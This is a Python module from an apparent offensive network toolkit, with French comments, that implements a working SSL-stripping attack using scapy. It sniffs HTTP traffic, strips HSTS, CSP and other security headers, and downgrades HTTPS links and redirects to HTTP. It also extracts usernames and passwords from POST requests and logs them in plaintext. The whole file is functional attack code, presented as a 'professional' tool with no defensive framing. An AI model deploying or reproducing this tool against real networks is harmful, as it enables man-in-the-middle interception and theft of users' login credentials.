"""
modules/ssl_strip.py
SSL Stripping professionnel.
- Approche proxy TCP transparent
- Downgrade HTTPS -> HTTP
- Suppression HSTS, CSP, Upgrade-Insecure-Requests
- Suivi des sessions pour maintenir la cohérence SEQ/ACK
- Logging des credentials capturés
"""
import re
import time
import threading
import socket
from typing import Dict, Optional, Set, Tuple
from dataclasses import dataclass, field

from scapy.all import sniff, sendp, Ether, IP, TCP, Raw

from core.logger import log
from core.config import conf, attack_conf
from core.utils import Counter


@dataclass
class HTTPSession:
    """Session HTTP traquée."""
    client_ip: str
    client_port: int
    server_ip: str
    server_port: int
    
    # Tracking des modifications pour ajustement SEQ/ACK
    client_seq_delta: int = 0  # Delta appliqué aux paquets client
    server_seq_delta: int = 0  # Delta appliqué aux paquets serveur
    
    # Dernier numéro de séquence vu
    last_client_seq: int = 0
    last_server_seq: int = 0
    
    # Requête en cours (pour logging)
    current_host: str = ""
    current_path: str = ""
    
    # Timestamps
    created: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    
    def session_key(self) -> str:
        return f"{self.client_ip}:{self.client_port}-{self.server_ip}:{self.server_port}"


@dataclass
class CapturedCredential:
    """Credential capturé."""
    timestamp: float
    client_ip: str
    host: str
    path: str
    username: str
    password: str


class SSLStripper:
    """
    SSL Stripper professionnel.
    
    Fonctionnalités:
    - Suppression des headers de sécurité (HSTS, CSP)
    - Downgrade des redirections HTTPS -> HTTP
    - Modification du contenu HTML (liens https -> http)
    - Capture des credentials dans les formulaires
    - Tracking des sessions pour cohérence TCP
    """
    
    # Patterns de credentials courants
    CREDENTIAL_PATTERNS = [
        # Format: (regex_pattern, username_group, password_group)
        (rb"(?:user(?:name)?|login|email)=([^&\s]+).*?(?:pass(?:word)?|pwd)=([^&\s]+)", 1, 2),
        (rb"(?:pass(?:word)?|pwd)=([^&\s]+).*?(?:user(?:name)?|login|email)=([^&\s]+)", 2, 1),
    ]
    
    # Headers à supprimer des réponses
    SECURITY_HEADERS = [
        b"Strict-Transport-Security",
        b"Content-Security-Policy",
        b"X-Content-Security-Policy",
        b"X-Frame-Options",
        b"X-XSS-Protection",
        b"Public-Key-Pins",
        b"Expect-CT"
    ]
    
    def __init__(
        self,
        interface: str = None,
        http_ports: Set[int] = None,
        capture_credentials: bool = True
    ):
        """
        :param interface: Interface réseau
        :param http_ports: Ports HTTP à surveiller
        :param capture_credentials: Capturer les credentials des POST
        """
        self.interface = interface or conf.interface
        self.http_ports = http_ports or {80, 8080}
        self.capture_credentials = capture_credentials
        
        # Sessions traquées
        self.sessions: Dict[str, HTTPSession] = {}
        self._lock = threading.Lock()
        
        # Credentials capturés
        self.credentials: list = []
        
        # Stats
        self.packets_modified = Counter()
        self.https_downgraded = Counter()
        self.hsts_stripped = Counter()
        self.credentials_captured = Counter()
        
        # État
        self.running = False
        self._thread: Optional[threading.Thread] = None
        self.start_time: float = 0.0
    
    def _get_session_key(self, pkt) -> Optional[str]:
        """Génère la clé de session."""
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return None
        
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_port = pkt[TCP].sport
        dst_port = pkt[TCP].dport
        
        # Normaliser la clé
        if src_port in self.http_ports:
            # Paquet du serveur vers client
            return f"{dst_ip}:{dst_port}-{src_ip}:{src_port}"
        else:
            # Paquet du client vers serveur
            return f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
    
    def _get_or_create_session(self, pkt) -> Optional[HTTPSession]:
        """Récupère ou crée une session."""
        key = self._get_session_key(pkt)
        if not key:
            return None
        
        with self._lock:
            if key not in self.sessions:
                src_port = pkt[TCP].sport
                if src_port in self.http_ports:
                    # Paquet du serveur
                    self.sessions[key] = HTTPSession(
                        client_ip=pkt[IP].dst,
                        client_port=pkt[TCP].dport,
                        server_ip=pkt[IP].src,
                        server_port=pkt[TCP].sport
                    )
                else:
                    # Paquet du client
                    self.sessions[key] = HTTPSession(
                        client_ip=pkt[IP].src,
                        client_port=pkt[TCP].sport,
                        server_ip=pkt[IP].dst,
                        server_port=pkt[TCP].dport
                    )
            
            session = self.sessions[key]
            session.last_activity = time.time()
            return session
    
    def _extract_credentials(self, payload: bytes, session: HTTPSession):
        """Extrait les credentials d'un POST."""
        if not self.capture_credentials:
            return
        
        for pattern, user_group, pass_group in self.CREDENTIAL_PATTERNS:
            match = re.search(pattern, payload, re.IGNORECASE)
            if match:
                try:
                    username = match.group(user_group).decode(errors='ignore')
                    password = match.group(pass_group).decode(errors='ignore')
                    
                    # URL decode basique
                    import urllib.parse
                    username = urllib.parse.unquote(username)
                    password = urllib.parse.unquote(password)
                    
                    cred = CapturedCredential(
                        timestamp=time.time(),
                        client_ip=session.client_ip,
                        host=session.current_host,
                        path=session.current_path,
                        username=username,
                        password=password
                    )
                    self.credentials.append(cred)
                    self.credentials_captured.increment()
                    
                    log.attack(
                        f"CREDENTIAL CAPTURED! "
                        f"Host: {session.current_host}, "
                        f"User: {username}, Pass: {password}"
                    )
                    
                except Exception:
                    pass
    
    def _strip_response_headers(self, payload: bytes) -> Tuple[bytes, bool]:
        """Supprime les headers de sécurité des réponses HTTP."""
        modified = False
        new_payload = payload
        
        for header in self.SECURITY_HEADERS:
            pattern = header + b":.*?\r\n"
            if re.search(pattern, new_payload, re.IGNORECASE):
                new_payload = re.sub(pattern, b"", new_payload, flags=re.IGNORECASE)
                modified = True
                
                if header == b"Strict-Transport-Security":
                    self.hsts_stripped.increment()
        
        return new_payload, modified
    
    def _downgrade_https_links(self, payload: bytes) -> Tuple[bytes, bool]:
        """Downgrade les liens HTTPS en HTTP."""
        modified = False
        new_payload = payload
        
        # Redirections Location:
        if b"Location: https://" in new_payload:
            new_payload = new_payload.replace(b"Location: https://", b"Location: http://")
            modified = True
            self.https_downgraded.increment()
        
        # Liens dans le HTML (seulement si Content-Type est HTML)
        if b"text/html" in payload[:500]:
            # Attributs src et href
            patterns = [
                (rb'(href\s*=\s*["\'])https://', rb'\1http://'),
                (rb'(src\s*=\s*["\'])https://', rb'\1http://'),
                (rb'(action\s*=\s*["\'])https://', rb'\1http://'),
            ]
            for pattern, replacement in patterns:
                new_payload, n = re.subn(pattern, replacement, new_payload, flags=re.IGNORECASE)
                if n > 0:
                    modified = True
                    self.https_downgraded.add(n)
        
        return new_payload, modified
    
    def _strip_request_headers(self, payload: bytes) -> Tuple[bytes, bool]:
        """Supprime les headers de sécurité des requêtes."""
        modified = False
        new_payload = payload
        
        # Supprimer Upgrade-Insecure-Requests
        if b"Upgrade-Insecure-Requests" in new_payload:
            new_payload = re.sub(
                b"Upgrade-Insecure-Requests:.*?\r\n",
                b"",
                new_payload
            )
            modified = True
        
        return new_payload, modified
    
    def _process_packet(self, pkt):
        """Traite un paquet HTTP."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return
        
        try:
            payload = pkt[Raw].load
            src_port = pkt[TCP].sport
            
            session = self._get_or_create_session(pkt)
            if not session:
                return
            
            new_payload = payload
            modified = False
            
            # Déterminer la direction
            is_from_server = (src_port in self.http_ports)
            
            if is_from_server:
                # Réponse du serveur -> Strip sécurité
                new_payload, m1 = self._strip_response_headers(new_payload)
                modified = modified or m1
                
                new_payload, m2 = self._downgrade_https_links(new_payload)
                modified = modified or m2
            else:
                # Requête du client
                # Extraire Host et Path pour le logging
                host_match = re.search(rb"Host:\s*([^\r\n]+)", payload)
                if host_match:
                    session.current_host = host_match.group(1).decode(errors='ignore')
                
                path_match = re.search(rb"(?:GET|POST)\s+([^\s]+)", payload)
                if path_match:
                    session.current_path = path_match.group(1).decode(errors='ignore')
                
                # Strip headers de requête
                new_payload, m3 = self._strip_request_headers(new_payload)
                modified = modified or m3
                
                # Capturer credentials dans les POST
                if payload.startswith(b"POST "):
                    self._extract_credentials(payload, session)
            
            # Si modifié, renvoyer le paquet
            if modified and new_payload != payload:
                # Construire le paquet modifié
                # Note: On utilise sendp avec Ether pour plus de contrôle
                
                # Calculer le delta de taille
                size_delta = len(new_payload) - len(payload)
                
                # Mettre à jour le tracking de séquence
                if is_from_server:
                    session.server_seq_delta += size_delta
                else:
                    session.client_seq_delta += size_delta
                
                # Créer le nouveau paquet
                if pkt.haslayer(Ether):
                    new_pkt = Ether(src=pkt[Ether].src, dst=pkt[Ether].dst) / \
                              IP(src=pkt[IP].src, dst=pkt[IP].dst, ttl=pkt[IP].ttl) / \
                              TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                                  flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                                  window=pkt[TCP].window) / \
                              Raw(load=new_payload)
                else:
                    new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst, ttl=pkt[IP].ttl) / \
                              TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                                  flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                                  window=pkt[TCP].window) / \
                              Raw(load=new_payload)
                
                # Envoyer
                sendp(new_pkt, iface=self.interface, verbose=False)
                
                self.packets_modified.increment()
                
                direction = "⬇️" if is_from_server else "⬆️"
                log.info(f"{direction} SSL Strip: {len(payload)} → {len(new_payload)} bytes")
        
        except Exception as e:
            pass
    
    def _cleanup_sessions(self):
        """Nettoie les sessions expirées."""
        now = time.time()
        with self._lock:
            expired = [
                key for key, session in self.sessions.items()
                if now - session.last_activity > 120
            ]
            for key in expired:
                del self.sessions[key]
    
    def _main_loop(self):
        """Boucle principale de sniffing."""
        port_filter = " or ".join(f"port {p}" for p in self.http_ports)
        bpf = f"tcp and ({port_filter})"
        
        log.info(f"Filtre BPF: {bpf}")
        
        try:
            sniff(
                iface=self.interface,
                filter=bpf,
                prn=self._process_packet,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Erreur sniff SSL strip: {e}")
    
    def start(self):
        """Démarre le SSL stripping."""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        
        log.attack("SSL Stripping démarré")
        log.info(f"  Ports surveillés: {self.http_ports}")
        log.info(f"  Capture credentials: {self.capture_credentials}")
        
        self._thread = threading.Thread(target=self._main_loop, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Arrête le SSL stripping."""
        if not self.running:
            return
        
        self.running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        
        duration = time.time() - self.start_time
        log.success(
            f"SSL Stripping arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Paquets modifiés: {self.packets_modified.value}, "
            f"Credentials: {self.credentials_captured.value}"
        )
    
    def get_stats(self) -> dict:
        """Retourne les statistiques."""
        return {
            "running": self.running,
            "duration": time.time() - self.start_time if self.start_time else 0,
            "packets_modified": self.packets_modified.value,
            "https_downgraded": self.https_downgraded.value,
            "hsts_stripped": self.hsts_stripped.value,
            "credentials_captured": self.credentials_captured.value,
            "active_sessions": len(self.sessions)
        }
    
    def get_credentials(self) -> list:
        """Retourne les credentials capturés."""
        return self.credentials.copy()
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
        return False